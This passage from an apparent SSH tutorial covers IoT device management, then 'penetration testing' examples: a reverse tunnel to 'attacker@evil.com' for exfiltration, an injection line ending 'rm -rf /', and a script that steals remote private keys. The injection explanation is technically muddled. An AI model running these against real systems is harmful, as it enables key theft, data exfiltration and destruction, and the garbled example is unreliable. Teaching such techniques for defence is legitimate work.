## üè† SSH in IoT and Smart Home Automation

### 19.1 Secure Remote Management of IoT Devices

```bash
ssh admin@iot-device.local -i ~/.ssh/iot_rsa
```

This command establishes a secure SSH connection to an IoT device. Here's what each part means:
- `ssh`: The command to start an SSH session
- `admin@iot-device.local`: The username (admin) and the device's local network address
- `-i ~/.ssh/iot_rsa`: Specifies the private key file for authentication

Using SSH keys instead of passwords increases security by eliminating the risk of weak or compromised passwords.

**Screenshot description:** The image shows a terminal window with a successful SSH connection to an IoT device. The prompt indicates that the user is now logged in as 'admin' on the device named 'iot-device'.

### 19.2 Automating IoT Updates via SSH

```bash
#!/bin/bash
for device in $(cat iot_devices.txt); do
    ssh -i ~/.ssh/iot_rsa admin@$device 'sudo apt update && sudo apt upgrade -y'
done
```

This script automates the process of updating multiple IoT devices using SSH. Here's how it works:
1. It reads a list of device addresses from a file called `iot_devices.txt`
2. For each device, it establishes an SSH connection
3. It runs update and upgrade commands on each device
4. The `-y` flag automatically answers 'yes' to prompts during the upgrade process

This script saves time and ensures all devices are updated consistently.

[Screenshot placeholder: Terminal window showing the script running and updating multiple IoT devices]

**Screenshot description:** The image displays a terminal window with the script executing. It shows multiple lines of output, each indicating a successful connection to a different IoT device and the progress of update and upgrade operations.

### 19.3 SSH Tunneling for IoT Data Collection

```bash
ssh -L 8086:localhost:8086 gateway@iot-hub.local
```

This command creates an SSH tunnel for securely accessing an IoT data collection service. Here's what it does:
- `-L 8086:localhost:8086`: Creates a local port forward
- `8086` (first occurrence): The local port on your machine
- `localhost:8086` (second occurrence): The destination on the remote machine
- `gateway@iot-hub.local`: The username and address of the IoT hub

This tunnel allows you to access a service (like InfluxDB) running on the IoT hub as if it were running on your local machine, providing a secure way to collect and analyze IoT data.

```python
import paramiko
import json

def send_command_to_device(device_ip, command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(device_ip, username='smarthome', key_filename='~/.ssh/smarthome_rsa')

    stdin, stdout, stderr = ssh.exec_command(command)
    response = stdout.read().decode()

    ssh.close()
    return json.loads(response)

# Usage
status = send_command_to_device('192.168.1.100', 'get_device_status')
print(f"Device Status: {status}")
```

</details>

This Python script demonstrates how to securely send commands to smart home devices using SSH. Here's how it works:
1. It uses the Paramiko library to create an SSH client
2. Connects to a device using its IP address and an SSH key for authentication
3. Sends a command to the device (in this case, 'get_device_status')
4. Receives and parses the JSON response from the device
5. Closes the SSH connection

This method ensures that all communications with smart home devices are encrypted and secure.

- Remote management and data collection are also performed securely through SSH connections

## üõ°Ô∏è Advanced SSH Penetration Testing Techniques

### 20.1 SSH Tunneling for Data Exfiltration

```bash
ssh -R 12345:localhost:80 attacker@evil.com
```

This command creates a reverse SSH tunnel, which can be used for data exfiltration in a penetration testing scenario. Here's what it does:
- `-R 12345:localhost:80`: Sets up a reverse port forwarding
- `12345`: The port on the remote machine (attacker's machine)
- `localhost:80`: The local address and port to be forwarded
- `attacker@evil.com`: The username and address of the attacker's machine

This tunnel allows the attacker to access a service running on port 80 of the compromised machine through port 12345 on their own machine.

[Screenshot placeholder: Terminal showing the establishment of a reverse SSH tunnel]

**Screenshot description:** The image displays a terminal window showing the SSH command being executed. It shows the successful establishment of the reverse tunnel, with no error messages.

### 20.2 SSH Command Injection

```bash
ssh 'victim@target.com; rm -rf /'
```

This command demonstrates a potential SSH command injection vulnerability. Here's how it works:
- `victim@target.com`: The intended SSH connection
- `; rm -rf /`: A malicious command injected after the SSH command

If not properly sanitized, this could execute the destructive command on the target system. This example highlights the importance of input validation and proper SSH configuration to prevent such attacks.

```python
import paramiko
import os

def harvest_keys(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target, username=username, password=password)

    stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa')
    harvested_key = stdout.read().decode()

    with open(f'harvested_{username}_key', 'w') as f:
        f.write(harvested_key)

    ssh.close()
    print(f"Key harvested for {username} on {target}")

# Usage (for ethical purposes only)
harvest_keys('target.com', 'user', 'password123')
```

</details>

This Python script demonstrates a technique for harvesting SSH private keys from a compromised system. Here's how it works:
1. Establishes an SSH connection using provided credentials
2. Executes a command to read the contents of the private key file
3. Saves the harvested key to a local file

This technique could be used by attackers to gain unauthorized access to other systems. It's crucial to protect SSH keys and use this script only for authorized testing.

```python
import socket
import threading
import paramiko
import sys

class SSHServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        print(f"Login attempt: {username}:{password}")
        return paramiko.AUTH_FAILED

def handle_connection(client):
    transport = paramiko.Transport(client)
    transport.add_server_key(paramiko.RSAKey.generate(2048))
    server = SSHServer()
    transport.start_server(server=server)

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 2222))
    sock.listen(100)
    print("SSH Honeypot running on port 2222...")

    while True:
        client, addr = sock.accept()
        print(f"Connection from: {addr[0]}:{addr[1]}")
        threading.Thread(target=handle_connection, args=(client,)).start()

start_server()
```

</details>

This Python script creates a simple SSH honeypot for gathering threat intelligence. Here's how it works:
1. It sets up a fake SSH server listening on port 2222
2. For each incoming connection, it starts a new thread to handle the connection
3. It logs all login attempts, including usernames and passwords
4. All authentication attempts are intentionally failed to prevent actual access

This honeypot can help security teams understand attack patterns and collect information about potential threats.
